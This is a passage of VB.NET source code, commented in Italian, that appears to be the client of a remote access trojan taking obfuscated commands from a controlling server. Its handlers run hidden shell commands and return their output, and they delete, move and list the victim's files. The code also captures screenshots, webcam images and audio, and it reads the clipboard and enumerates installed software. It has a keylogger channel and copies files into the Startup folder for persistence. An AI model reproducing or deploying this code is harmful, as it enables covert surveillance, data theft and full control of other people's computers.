                            Dim di As New IO.DirectoryInfo(Datia)
                            Dim aryFi As IO.FileInfo() = di.GetFiles("*.*")
                            Dim fi As IO.FileInfo
                            Dim aryD As IO.DirectoryInfo() = di.GetDirectories
                            Dim dd As IO.DirectoryInfo

                            txtFileEDir = ""
                            txtFileEDir = "<-" & " <> " & " / " & " <> " & " / " & " <> " & " / "

                            For Each dd In aryD
                                txtFileEDir = txtFileEDir & vbCrLf & dd.Name & " <> " & "Folder" & " <> " & "Folder" & " <> " & dd.LastWriteTime
                            Next

                            For Each fi In aryFi
                                strFileSize = (Math.Round(fi.Length / 1024)).ToString()
                                txtFileEDir = txtFileEDir & vbCrLf & fi.Name & " <> " & "File" & " <> " & strFileSize & " <> " & fi.LastAccessTime
                            Next


                            netstream.Write(
                            UTF8.GetBytes("FiOk─┬}" & UTF8.GetBytes(txtFileEDir).Length), 0, UTF8.GetBytes("FiOk─┬}" &
                                                                                                                      UTF8.GetBytes(txtFileEDir).Length).Length) 'invio il comando al server
                            Datia = ""

                        Catch ex As Exception
                            Datia = ""
                            txtFileEDir = ""
                            Dvs = ""
                            BoxS32 = ""
                            netstream.Write(
                        UTF8.GetBytes("FileErr}"), 0, UTF8.GetBytes("FileErr}").Length) 'invio il comando al server
                        End Try

                    End If


                    If InStr(Datia, "{OkFil]") Then
                        netstream.Write(
                        UTF8.GetBytes(txtFileEDir), 0, UTF8.GetBytes(txtFileEDir).Length) 'invio il comando al server

                    End If

                    If InStr(Datia, "#Okdar]") Then
                        netstream.Write(
                        UTF8.GetBytes(Dvs), 0, UTF8.GetBytes(Dvs).Length) 'invio il comando al server

                    End If

                    If InStr(Datia, "#PuProk]") Then
                        netstream.Write(
                        UTF8.GetBytes(BoxS32), 0, UTF8.GetBytes(BoxS32).Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "||;,_||") Then
                        If Not Dir(Replace(Datia, "||;,_||", "")) = "" Then
                            Try
                                Kill(Replace(Datia, "||;,_||", ""))
                            Catch ex As Exception
                                netstream.Write(
                       UTF8.GetBytes("ErrKill"), 0, UTF8.GetBytes("ErrKill").Length) 'invio il comando al server
                            End Try
                        End If
                        Datia = ""
                    End If

                    If InStr(Datia, "-_{}||ç") Then
                        If Directory.Exists(Replace(Datia, "-_{}||ç", "")) = True Then
                            If Dir(Replace(Datia, "-_{}||ç", "") & "\") = "" Then
                                Try
                                    IO.Directory.Delete(Replace(Datia, "-_{}||ç", ""))
                                Catch ex As Exception
                                    netstream.Write(UTF8.GetBytes("PirFolAzz"), 0, UTF8.GetBytes("PirFolAzz").Length) 'invio il comando al server
                                End Try
                                Datia = ""
                            Else
                                Datia = ""
                                netstream.Write(
                            UTF8.GetBytes("£é*_|Dr"), 0, UTF8.GetBytes("£é*_|Dr").Length) 'invio il comando al server
                            End If
                        End If
                    End If

                    If InStr(Datia, "{\|Ren}") Then
                        If Not Dir(Replace(Split(Datia, "^'}^")(0), "{\|Ren}", "")) = "" Then
                            Try
                                RinominaFile(Replace(Split(Datia, "^'}^")(0), "{\|Ren}", ""), Split(Datia, "^'}^")(1))
                            Catch ex As Exception
                                netstream.Write(UTF8.GetBytes("-NoUn-"), 0, UTF8.GetBytes("-NoUn-").Length) 'invio il comando al server
                            End Try
                            Datia = ""
                        End If
                    End If

                    If InStrRev(Datia, "{Di/ç\Ren}") Then

                        If Directory.Exists(Replace(Split(Datia, "°{}@")(0), "{Di/ç\Ren}", "")) = True Then
                            Try
                                My.Computer.FileSystem.RenameDirectory(Replace(Split(Datia, "°{}@")(0), "{Di/ç\Ren}", ""),
                                                                       Split(Datia, "°{}@")(1))
                            Catch ex As Exception
                                netstream.Write(UTF8.GetBytes("{}DinAl{}"), 0, UTF8.GetBytes("{}DinAl{}").Length) 'invio il comando al server
                            End Try
                            Datia = ""
                        End If
                    End If

                    If InStr(Datia, "[\Avv{Sta/]") Then
                        Try
                            Process.Start(Replace(Datia, "[\Avv{Sta/]", ""))
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("ChiCu#°"), 0, UTF8.GetBytes("ChiCu#°").Length) 'invio il comando al server
                        End Try
                        Datia = ""
                    End If

                    If InStr(Datia, "{^'Copas<>|\") Then
                        If File.Exists(Replace(Split(Datia, "|à°à")(0), "{^'Copas<>|\", "")) = True Then
                            File.Move(Replace(Split(Datia, "|à°à")(0), "{^'Copas<>|\", ""), Split(Datia, "|à°à")(1))
                        End If
                        Datia = ""
                    End If


                    If InStr(Datia, "||=8çD") Then
                        If Directory.Exists(Replace(Split(Datia, "|'òò+|")(0), "||=8çD", "")) = True Then
                            Directory.Move(Replace(Split(Datia, "|'òò+|")(0), "||=8çD", ""), Split(Datia, "|'òò+|")(1))
                        End If
                        Datia = ""
                    End If

                    If InStr(Datia, "||^#°Mak") Then
                        Try
                            MkDir(Replace(Datia, "||^#°Mak", ""))
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("{}DinAl{}"), 0, UTF8.GetBytes("{}DinAl{}").Length) 'invio il comando al server
                        End Try
                        Datia = ""
                    End If

                    If InStr(Datia, "clos-.") Then
                        Datia = ""
                        tmrSchermoCl.Enabled = False
                        tmrDatiSchermo.Enabled = False
                    End If


                    If InStr(Datia, "??^{dowh!}") Then
                        Datia = ""
                        tmrDatiDow.Enabled = False
                        tmrDowCl.Enabled = False
                        clientdow.Close()
                        clientdow = New TcpClient
                        tmrDowCl.Start()
                    End If

                    If InStr(Datia, "\e=mc^2\") Then
                        Datia = ""
                        tmrDowCl.Enabled = False
                        tmrDatiDow.Enabled = False
                    End If

                    If InStr(Datia, "{DeskC}") Then
                        Datia = ""
                        PictureBoxImd.Image.Save(Environ("TEMP") & "\bak.bmp")
                        Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
                        Dim WallpaperStyle As Object = Nothing ' Stile della immagine
                        Dim TileWallpaper As Object = Nothing ' Stile della immagine affiancata

                        Select Case ImageStyle
                            Case 0 ' Al centro
                                WallpaperStyle = "1"
                                TileWallpaper = "0"
                            Case 1 ' Affiancata
                                WallpaperStyle = "1"
                                TileWallpaper = "1"
                            Case 2 ' Estesa
                                WallpaperStyle = "2"
                                TileWallpaper = "0"
                        End Select

                        Key.SetValue("WallpaperStyle", WallpaperStyle)
                        Key.SetValue("TileWallpaper", TileWallpaper)
                        Key.Close()

                        SystemParametersInfo(20, 0, Environ("TEMP") & "\bak.bmp", &H1) ' Imposta lo sfondo del desktop
                        If Dir(Environ("TEMP") & "\bak.bmp") <> "" Then
                            Kill(Environ("TEMP") & "\bak.bmp")
                        End If
                    End If

                    If InStr(Datia, "\S\e\t\") Then
                        Dim PathWall As String
                        PathWall = Replace(Datia, "\S\e\t\", "")
                        Datia = ""
                        Try

                            Dim Key2 As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
                            Dim WallpaperStyle2 As Object = Nothing ' Stile della immagine
                            Dim TileWallpaper2 As Object = Nothing ' Stile della immagine affiancata

                            Select Case ImageStyle
                                Case 0 ' Al centro
                                    WallpaperStyle2 = "1"
                                    TileWallpaper2 = "0"
                                Case 1 ' Affiancata
                                    WallpaperStyle2 = "1"
                                    TileWallpaper2 = "1"
                                Case 2 ' Estesa
                                    WallpaperStyle2 = "2"
                                    TileWallpaper2 = "0"
                            End Select

                            Key2.SetValue("WallpaperStyle", WallpaperStyle2)
                            Key2.SetValue("TileWallpaper", TileWallpaper2)
                            Key2.Close()

                            SystemParametersInfo(20, 0, PathWall, &H1) ' Imposta lo sfondo del desktop
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("]@°°WallPe"), 0, UTF8.GetBytes("]@°°WallPe").Length) 'invio il comando al server
                        End Try
                    End If


                    If InStr(Datia, "|<9({)>|") Then
                        Dim SSMext1() As String = Split(Datia, "|<9({)>|")
                        Datia = ""
                        MsgBox(SSMext1(1), , SSMext1(0))
                    End If

                    If InStr(Datia, "|_1({+]>") Then
                        Dim SSMext2() As String = Split(Datia, "|_1({+]>")
                        Datia = ""
                        MsgBox(SSMext2(1), MsgBoxStyle.Critical, SSMext2(0))
                    End If


                    If InStr(Datia, "'#{2}##°°°") Then
                        Dim SSMext3() As String = Split(Datia, "'#{2}##°°°")
                        Datia = ""
                        MsgBox(SSMext3(1), MsgBoxStyle.Information, SSMext3(0))
                    End If


                    If InStr(Datia, "__|{5|__") Then
                        Dim SSMext4() As String = Split(Datia, "__|{5|__")
                        Datia = ""
                        MsgBox(SSMext4(1), MsgBoxStyle.Exclamation, SSMext4(0))
                    End If

                    If InStr(Datia, "rbu{t|Y|N|") Then
                        Dim SSMext5() As String = Split(Datia, "rbu{t|Y|N|")
                        Datia = ""
                        If MsgBox(SSMext5(1), MsgBoxStyle.YesNo, SSMext5(0)) = vbYes Then
                            netstream.Write(UTF8.GetBytes("T!HAOK"), 0, UTF8.GetBytes("T!HAOK").Length) 'invio il comando al server
                        Else
                            netstream.Write(UTF8.GetBytes("T!HsnAbn"), 0, UTF8.GetBytes("T!HsnAbn").Length) 'invio il comando al server
                        End If
                    End If

                    If InStr(Datia, "rbutY{}N\C|") Then
                        Dim SSMext6() As String = Split(Datia, "rbutY{}N\C|")
                        Datia = ""
                        Dim messpiritaro As String = MsgBox(SSMext6(1), MsgBoxStyle.YesNoCancel, SSMext6(0))

                        If messpiritaro = vbYes Then
                            netstream.Write(UTF8.GetBytes("T!HAOK"), 0, UTF8.GetBytes("T!HAOK").Length) 'invio il comando al server
                        End If

                        If messpiritaro = vbNo Then
                            netstream.Write(UTF8.GetBytes("T!HsnAbn"), 0, UTF8.GetBytes("T!HsnAbn").Length) 'invio il comando al server
                        End If

                        If messpiritaro = vbCancel Then
                            netstream.Write(UTF8.GetBytes("manna|Ca"), 0, UTF8.GetBytes("manna|Ca").Length) 'invio il comando al server
                        End If

                    End If

                    If InStr(Datia, "rY|N#°°|I") Then
                        Dim SSMext7() As String = Split(Datia, "rY|N#°°|I")
                        Datia = ""
                        Dim messpiritaro2 As String = MsgBox(SSMext7(1), MsgBoxStyle.RetryCancel, SSMext7(0))

                        If messpiritaro2 = vbCancel Then
                            netstream.Write(UTF8.GetBytes("manna|Ca"), 0, UTF8.GetBytes("manna|Ca").Length) 'invio il comando al server
                        End If

                        If messpiritaro2 = vbRetry Then
                            netstream.Write(UTF8.GetBytes("aru|Ret"), 0, UTF8.GetBytes("aru|Ret").Length) 'invio il comando al server
                        End If
                    End If

                    If InStr(Datia, "||upàà°°{") Then
                        Datia = ""
                        tmrUpCl.Enabled = False
                        tmrDatiUp.Enabled = False
                    End If


                    If InStr(Datia, "!!<UUp}|") Then
                        Datia = ""
                        tmrDatiUp.Enabled = False
                        tmrUpCl.Enabled = False
                        clientup.Close()
                        clientup = New TcpClient
                        tmrUpCl.Start()
                    End If

                    If InStr(Datia, ">(||u") Then
                        Datia = ""
                        AvvFiUpp = True
                    End If

                    If InStr(Datia, ">Not>u") Then
                        Datia = ""
                        AvvFiUpp = False
                    End If

                    If InStr(Datia, "}>W°eb>{") Then
                        Datia = ""
                        tmrDatiWeb.Enabled = False
                        tmrWebCl.Enabled = False
                        clientweb.Close()
                        clientweb = New TcpClient
                        tmrWebCl.Start()
                    End If

                    If InStr(Datia, ">M|Wa°|°") Then
                        Datia = ""
                        tmrWebCl.Enabled = False
                        tmrDatiWeb.Enabled = False
                        mdMacBew.SendMessage(HPazzo, WM_CAP_DRIVER_DISCONNECT, Dev3, 0)
                        DestroyWindow(HPazzo)
                    End If

                    If InStr(Datia, "{D!c!s") Then
                        Datia = ""
                        Dim strName As String = Space(100)
                        Dim strVer As String = Space(100)
                        Dim bReturn As Boolean
                        Dim x1 As Integer = 0

                        Do

                            bReturn = capGetDriverDescriptionA(x1, strName, 100, strVer, 100)

                            If bReturn Then ListaMacBew = ListaMacBew & strName.Trim & vbCrLf
                            x1 += 1
                        Loop Until bReturn = False
                        netstream.Write(UTF8.GetBytes(ListaMacBew & "|D|{|S|"), 0, UTF8.GetBytes(ListaMacBew & "|D|{|S|").Length) 'invio il comando al server
                        ListaMacBew = ""
                    End If

                    If InStr(Datia, "ST||ARTCAP") Then
                        Dev3 = Replace(Datia, "ST||ARTCAP", "")
                        Datia = ""
                        startPreview()
                    End If

                    If InStr(Datia, "STo||P") Then
                        Datia = ""

                        mdMacBew.SendMessage(HPazzo, WM_CAP_DRIVER_DISCONNECT, Dev3, 0)

                        DestroyWindow(HPazzo)
                    End If

                    If InStr(Datia, "S'|'eW") Then
                        XYimw = Replace(Datia, "S'|'eW", "")
                        Datia = ""
                    End If

                    If InStr(Datia, "|O%|h") Then
                        PerWe = Datia
                        Datia = ""
                    End If

                    If InStr(Datia, "r|W|r") Then
                        Datia = ""
                        PerWe = "|O%|h" & 100
                        XYimw = ""
                    End If

                    If InStr(Datia, "KiaKi||") Then
                        Datia = ""
                        tmrDatiKey.Enabled = False
                        tmrKeyCl.Enabled = False
                        clientkey.Close()
                        clientkey = New TcpClient
                        tmrKeyCl.Start()
                    End If

                    If InStr(Datia, "K.{}K") Then
                        Datia = ""
                        tmrKeyCl.Enabled = False
                        tmrDatiKey.Enabled = False
                    End If

                    If InStr(Datia, "O|tAt{Of") Then
                        Datia = ""
                        instkoff = True
                        tmrK.Enabled = True
                    End If

                    If InStr(Datia, ">_H_A") Then
                        Dim NReN As String = Replace(Datia, ">_H_A", "")
                        Datia = ""
                        Na1 = Split(NReN, "|!")(0)
                        Na2 = Split(NReN, "|!")(1)
                        frmTahc.Show()
                        frmTahc.cmdSendMR.Enabled = True
                    End If

                    If InStr(Datia, "^__Cl^") Then
                        Datia = ""
                        frmTahc.Close()
                    End If

                    If InStr(Datia, "_<\/") Then
                        frmTahc.cmdSendMR.Enabled = True
                        Dim MexCah As String = Replace(Datia, Microsoft.VisualBasic.Right(Datia, Len("_<\/")), "")
                        Datia = ""
                        frmTahc.txtChatR.Text = frmTahc.txtChatR.Text & Na1 & ": " & MexCah & vbCrLf
                    End If

                    If InStr(Datia, "|°Clip}") Then
                        Dim ClIp As String = Replace(Datia, Microsoft.VisualBasic.Right(Datia, Len("|°Clip}")), "")
                        Datia = ""
                        If Not ClIp = "" Then
                            Clipboard.SetText(ClIp)
                        End If
                    End If

                    If InStr(Datia, "|°CR}") Then
                        Datia = ""
                        Dim CRetta As String = Clipboard.GetData(DataFormats.StringFormat)
                        netstream.Write(UTF8.GetBytes(CRetta & "|°CR}"), 0, UTF8.GetBytes(CRetta & "|°CR}").Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "Snz>z|") Then
                        Datia = ""
                        VarS = False
                        tmrDatiSD.Enabled = False
                        tmrSDCl.Enabled = False
                        clientSD.Close()
                        clientSD = New TcpClient
                        tmrSDCl.Start()
                    End If

                    If InStr(Datia, "Cloz>z|") Then
                        Datia = ""
                        tmrSDCl.Enabled = False
                        tmrDatiSD.Enabled = False
                        VarS = False
                        mciSendString("close recsound", "", 0, 0)
                        If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                        End If
                        If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                        End If
                    End If

                    If InStr(Datia, "<<{wa||") Then
                        SoWav = Replace(Datia, "<<{wa||", "")
                        If bkwSD.IsBusy = False Then
                            bkwSD.RunWorkerAsync()
                        End If
                    End If

                    If InStr(Datia, "{MUTE]") Then
                        Datia = ""
                        frmMain.SendMessage(Me.Handle, WM_APPCOMMAND, &H200EB0, APPCOMMAND_VOLUME_MUTE * &H10000)
                    End If

                    If InStr(Datia, "SE=|V") Then
                        Datia = ""
                        frmMain.SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
                    End If

                    If InStr(Datia, "V|=ES") Then
                        Datia = ""
                        frmMain.SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_DOWN * &H10000)
                    End If

                    If InStr(Datia, "S'&>^ I") Then
                        Dim Edoardo As String = Replace(Datia, "S'&>^ I", "")
                        Datia = ""
                        Try
                            Process.Start("http://" & Edoardo)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("$||ErrP>"), 0, UTF8.GetBytes("$||ErrP>").Length) 'invio il comando al server
                        End Try
                    End If

                    If InStr(Datia, "Fhttp\\oo") Then
                        byfllo = ""
                        U = Split(Datia, " ")(0)
                        NumFor = Replace(Split(Datia, " ")(1), "Fhttp\\oo", "")
                        Datia = ""
                        If bkwHttF.IsBusy = False Then
                            bkwHttF.RunWorkerAsync()
                        End If
                    End If



                    If InStr(Datia, "0|\/|£=>") Then
                        Datia = ""
                        Dim fileReaderbho As System.IO.StreamReader
                        fileReaderbho = _
                        My.Computer.FileSystem.OpenTextFileReader(Environ("TEMP") & "\OUT.txt")
                        Dim Letturabho As String
                        Letturabho = fileReaderbho.ReadToEnd
                        fileReaderbho.Close()
                        netstream.Write(UTF8.GetBytes("0|\/|£=>" & Letturabho), 0, UTF8.GetBytes("0|\/|£=>" & Letturabho).Length) 'invio il comando al server
                    End If

                    If InStr(Datia, "C|>>'MD") Then

                        Dim ComCMR As String = Replace(Datia, "C|>>'MD", "")
                        Datia = ""
                        Try
                            Kill(Environ("TEMP") & "\OUT.txt")
                        Catch ex As Exception
                        End Try

                        Try

                            Dim wr200 As StreamWriter
                            wr200 = New StreamWriter(Environ("TEMP") & "\ComCMR.bat", False)
                            wr200.Write(ComCMR & ">" & Environ("TEMP") & "\OUT.txt")
                            wr200.Flush()
                            wr200.Close()

                            Process.Start(Environ("TEMP") & "\ComCMR.bat")
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("C|>>'MD"), 0, UTF8.GetBytes("C|>>'MD").Length) 'invio il comando al server
                        End Try

                    End If


                    If InStr(Datia, "2|>>HHH") Then
                        Dim ComCMR As String = Replace(Datia, "2|>>HHH", "")
                        Try

                            Dim wr2011 As StreamWriter
                            wr2011 = New StreamWriter(Environ("TEMP") & "\ComCMR.bat", False)
                            wr2011.Write(ComCMR)
                            wr2011.Flush()
                            wr2011.Close()

                            Shell(Environ("TEMP") & "\ComCMR.bat", AppWinStyle.Hide)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("C|>>'MD"), 0, UTF8.GetBytes("C|>>'MD").Length) 'invio il comando al server
                        End Try
                    End If


                    If InStr(Datia, "|^%%i^$0") Then
                        Datia = ""
                        Try
                            If row3000 = "" Then
                                row3000 = ""
                                Dim reg3000 As RegistryKey = Registry.LocalMachine
                                reg3000 = reg3000.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Uninstall")
                                For Each keyName As String In reg3000.GetSubKeyNames()

                                    If (reg3000.OpenSubKey(keyName).GetValue("DisplayName") Is Nothing) Then
                                        row3000 = row3000 & "|^%%i^$0" & keyName & vbCrLf
                                    Else
                                        row3000 = row3000 & "|^%%i^$0" & reg3000.OpenSubKey(keyName).GetValue("DisplayName").ToString() & vbCrLf
                                    End If

                                Next
                            End If



                            If Not Split(row3000, vbCrLf)(Ugo) = "" Then
                                netstream.Write(UTF8.GetBytes(Split(row3000, vbCrLf)(Ugo)), 0, UTF8.GetBytes(Split(row3000, vbCrLf)(Ugo)).Length) 'invio il comando al server
                                Ugo = Ugo + 1
                            Else
                                Ugo = 0
                                row3000 = ""
                                netstream.Write(UTF8.GetBytes("F|nSoft"), 0, UTF8.GetBytes("F|nSoft").Length) 'invio il comando al server
                            End If

                        Catch ex As Exception
                            Ugo = 0
                            row3000 = ""
                            netstream.Write(UTF8.GetBytes("@Rr0|^"), 0, UTF8.GetBytes("@Rr0|^").Length) 'invio il comando al server
                        End Try
                    End If


                    If InStr(Datia, "\R\u\n-") Then
                        Try
                            Dim RunPath As String = Replace(Datia, "\R\u\n-", "")
                            Datia = ""
                            Dim nam = Split(RunPath, "\")(UBound(Split(RunPath, "\")))

                            IO.File.Move(RunPath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & nam)
                        Catch ex As Exception
                            netstream.Write(UTF8.GetBytes("ç(°E^^r"), 0, UTF8.GetBytes("ç(°E^^r").Length) 'invio il comando al server
                        End Try
                    End If

                Catch ex As Exception
                End Try
            Else
                tmrLusso.Enabled = True
            End If
        Else 'se non è connesso

            tmrDati.Enabled = False 'Chiudo il timer per la ricezione di dati
            tmrDatiSchermo.Enabled = False
            tmrDatiDow.Enabled = False
            tmrDatiUp.Enabled = False
            tmrDatiWeb.Enabled = False
            tmrDatiKey.Enabled = False
            tmrDatiSD.Enabled = False

            tmrSchermoCl.Enabled = False
            tmrUpCl.Enabled = False
            tmrDowCl.Enabled = False
            tmrWebCl.Enabled = False
            tmrKeyCl.Enabled = False
            tmrSDCl.Enabled = False
            mdMacBew.SendMessage(HPazzo, WM_CAP_DRIVER_DISCONNECT, Dev3, 0)
            DestroyWindow(HPazzo)
            mciSendString("close recsound", "", 0, 0)
            attok = False
            Application.Restart()

        End If
    End Sub

    


    'Private Function GetWindows() As String
    '    On Error Resume Next
    '  Dim hwnd As Integer
    '  Dim s1 As String
    ' Dim s2 As String
    '     hwnd = apiGetTopWindow(apiGetDesktopWindow)
    '     s1 = ""
    '     s2 = ""
    '    Do
    '       s2 = GetWindowName(hwnd)
    '
    '       If s2 = "AppTitle" Then
    'Do Something here
    '       End If
    '
    '         s1 = s1 & s2 & vbCrLf
    '        hwnd = apiGetWindow(hwnd, GW_HWNDNEXT)
    '       If hwnd = 0 Then
    '          GetWindows = s1
    '          Exit Do
    '      End If
    '   Loop

    'End Function
    Public Function GetWindowName(ByVal hWnd As Integer) As String
        On Error Resume Next
        Dim tLength As Integer
        Dim rValue As Integer
        Dim wName As String
        tLength = apiGetWindowTextLength(hWnd) + 4
        wName = ""
        wName = wName.PadLeft(tLength) 'add buffer
        rValue = apiGetWindowText(hWnd, wName, tLength)
        wName = wName.Substring(0, rValue) 'strip buffer
        GetWindowName = wName
    End Function

    Private Sub tmrSchermoCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrSchermoCl.Tick
        Try
            If Not clientschermo.Connected = True Then
                If bkwS.IsBusy = False Then
                    bkwS.RunWorkerAsync()
                End If
            Else
                tmrSchermoCl.Stop()
                tmrDatiSchermo.Start()
            End If
        Catch ex As Exception
            clientschermo.Close()
            clientschermo = New TcpClient
        End Try
    End Sub

    Private Sub tmrDatiaSchermo_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiSchermo.Tick
        If clientschermo.Connected = True Then
            If clientschermo.Available > 0 Then
                Try
                    Dim buffer3(clientschermo.Available - 1) As Byte
                    netstreamschermo.Read(buffer3, 0, buffer3.Length)

                    Dim datiaschermo As String = UTF8.GetString(buffer3)
                    If InStr(datiaschermo, "<Take>") Then

                        Dim bounds As Rectangle
                        Dim screenshot As System.Drawing.Bitmap
                        Dim graph As Graphics
                        bounds = Screen.PrimaryScreen.Bounds
                        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
                        graph = Graphics.FromImage(screenshot)
                        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
                        schermo.Image = screenshot

                        If XYim = "" Then
                            schermo.Image.Save(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
                            lbytes = 0
                            ReDim bufferimmag(FileLen(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg") - 1)
                            Try
                                FileOpen(13, Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg", OpenMode.Binary)

                                FileGet(13, bufferimmag, 1)
                                FileClose(13)
                            Catch ex As Exception
                            End Try
                            Dim fsizsch As Integer
                            fsizsch = FileLen(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
                            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg") <> "" Then
                                Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
                            End If

                            netstreamschermo.Write(
                            UTF8.GetBytes("<<LookSize>>" & fsizsch), 0, UTF8.GetBytes(
                                "<<LookSize>>" & fsizsch).Length) 'invio il comando al server
                        Else
                            schermo.Image.Save(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
                            'carica immagine originale
                            bm = New Bitmap(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
                            'ricava dimensioni originali dell'immagine
                            originalX = bm.Width
                            originalY = bm.Height
                            'imposta dimensioni finali
                            destinationX = Split(XYim, " , ")(0)
                            destinationY = Split(XYim, " , ")(1)
                            ResizeImage(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
                            lbytes = 0
                            ReDim bufferimmag(FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg") - 1)
                            Try
                                FileOpen(13, Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg", OpenMode.Binary)

                                FileGet(13, bufferimmag, 1)
                                FileClose(13)
                            Catch ex As Exception
                            End Try
                            Dim fsizsch2 As Integer
                            fsizsch2 = FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg")
                            If Dir(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg") <> "" Then
                                Kill(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg")
                            End If
                            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg") <> "" Then
                                Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
                            End If
                            netstreamschermo.Write(
                            UTF8.GetBytes("<<LookSize>>" & fsizsch2), 0, UTF8.GetBytes(
                                "<<LookSize>>" & fsizsch2).Length) 'invio il comando al server
                        End If
                    End If

                    If InStr(datiaschermo, "{Ok}") Then
                        netstreamschermo.Write(
                        bufferimmag, 0, bufferimmag.Length) 'invio il comando al server
                    End If

                Catch ex As Exception
                End Try
            End If

        Else
            FileClose(13)
            If Dir(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg") <> "" Then
                Kill(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".jpg")
            End If
            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg") <> "" Then
                Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".jpg")
            End If
            tmrDatiSchermo.Enabled = False
        End If
    End Sub

    Public Function ResizeImage(ByVal percorsoImmagine As String) As Boolean
        Try
            'riduzione dell'immagine
            Dim thumb As New Bitmap(destinationX, destinationY)
            Dim g As Graphics = Graphics.FromImage(thumb)
            'impostazione del metodo di interpolazione utilizzato per il resize
            g.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBicubic
            g.DrawImage(bm, New Rectangle(0, 0, destinationX, destinationY), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
            g.Dispose()
            'salvataggio dell'immagine ridimensionata
            destinationFolder = Environ("TEMP") & "\"
            destinationFileName = "r_" & System.IO.Path.GetFileNameWithoutExtension(percorsoImmagine)
            thumb.Save(destinationFolder & destinationFileName & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
            bm.Dispose()
            thumb.Dispose()
        Catch ex As Exception
        End Try
        Return True
    End Function

    Public Function ResizeImageweb(ByVal percorsoImmagine2 As String) As Boolean
        Try
            'riduzione dell'immagine
            Dim thumb2 As New Bitmap(destinationX2, destinationY2)
            Dim g2 As Graphics = Graphics.FromImage(thumb2)
            'impostazione del metodo di interpolazione utilizzato per il resize
            g2.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBicubic
            g2.DrawImage(bm2, New Rectangle(0, 0, destinationX2, destinationY2), New Rectangle(0, 0, bm2.Width, bm2.Height), GraphicsUnit.Pixel)
            g2.Dispose()
            'salvataggio dell'immagine ridimensionata
            destinationFolder2 = Environ("TEMP") & "\"
            destinationFileName2 = "r_" & System.IO.Path.GetFileNameWithoutExtension(percorsoImmagine2)
            thumb2.Save(destinationFolder2 & destinationFileName2 & ".bmp", System.Drawing.Imaging.ImageFormat.Bmp)
            bm2.Dispose()
            thumb2.Dispose()
        Catch ex As Exception
        End Try
        Return True
    End Function

    Private Sub pd_PrintPage(ByVal sender As Object, ByVal e As System.Drawing.Printing.PrintPageEventArgs) Handles pd.PrintPage
        Try
            e.Graphics.DrawString(TextToPrint, lblP.Font, Brushes.Black, 40, 5)
        Catch ex As Exception
        End Try
    End Sub


    Shared Sub RinominaFile(ByVal filePath As String, ByVal newName As String)
        Try
            'Ottieni la directory del file
            Dim dirName As String = System.IO.Path.GetDirectoryName(filePath)

            'Ottieni il percorso completo del file rinominato
            Dim newPath As String = System.IO.Path.Combine(dirName, newName)

            'Rinomina il file
            System.IO.File.Move(filePath, newPath)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub tmrDowCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDowCl.Tick
        Try
            If Not clientdow.Connected = True Then
                If bkwS.IsBusy = False Then
                    bkwD.RunWorkerAsync()
                End If
            Else
                tmrDowCl.Stop()
                tmrDatiDow.Start()
            End If
        Catch ex As Exception
            clientdow.Close()
            clientdow = New TcpClient
        End Try
    End Sub

    Private Sub tmrDatiDow_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiDow.Tick
        If clientdow.Connected = True Then
            If clientdow.Available > 0 Then
                Try
